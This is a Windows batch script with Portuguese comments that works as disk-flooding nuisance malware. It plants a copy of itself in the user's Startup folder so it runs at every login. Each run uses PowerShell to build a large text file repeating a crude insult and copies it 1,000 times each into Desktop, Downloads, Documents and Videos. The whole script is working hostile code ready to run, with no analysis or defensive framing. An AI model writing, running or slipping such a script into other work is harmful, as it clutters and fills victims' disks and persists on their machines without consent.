@echo off
setlocal

REM ===== CAMINHOS =====
set DESKTOP=%USERPROFILE%\Desktop
set DOWNLOADS=%USERPROFILE%\Downloads
set DOCUMENTS=%USERPROFILE%\Documents
set VIDEOS=%USERPROFILE%\Videos
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set MODEL=%TEMP%\Lxzinn_modelo.txt

REM =====================================================
REM 1️⃣ CRIAR BAT DO STARTUP (PRIMEIRO)
REM =====================================================
> "%STARTUP%\startup_lxzinn.bat" (
    echo @echo off
    echo set MODEL=%%TEMP%%\Lxzinn_modelo.txt
    echo if not exist "%%MODEL%%" ^(
    echo   powershell -NoProfile -Command "$t='LUIZ COMEU SUA BUNDA OTARIO AHHAHAH'; 1..100000 ^| ForEach-Object { $t } ^| Set-Content -Encoding ASCII '%%MODEL%%'"
    echo ^)
    echo for /L %%%%i in ^(1,1,1000^) do ^(
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Desktop\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Downloads\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Documents\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Videos\Lxzinn__%%%%i.txt" ^>nul
    echo ^)
)

REM =====================================================
REM 2️⃣ CRIAR MODELO AGORA (SE NÃO EXISTIR)
REM =====================================================
if not exist "%MODEL%" (
    powershell -NoProfile -Command ^
    "$t='LUIZ COMEU SUA BUNDA OTARIO AHHAHAH'; 1..100000 | ForEach-Object { $t } | Set-Content -Encoding ASCII '%MODEL%'"
)

REM =====================================================
REM 3️⃣ CRIAR TXT AGORA
REM =====================================================
for /L %%i in (1,1,1000) do (
    copy /Y "%MODEL%" "%DESKTOP%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%DOWNLOADS%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%VIDEOS%\Lxzinn__%%i.txt" >nul
)

echo.
echo ✔ Startup criado PRIMEIRO
echo ✔ Arquivos criados agora
pause
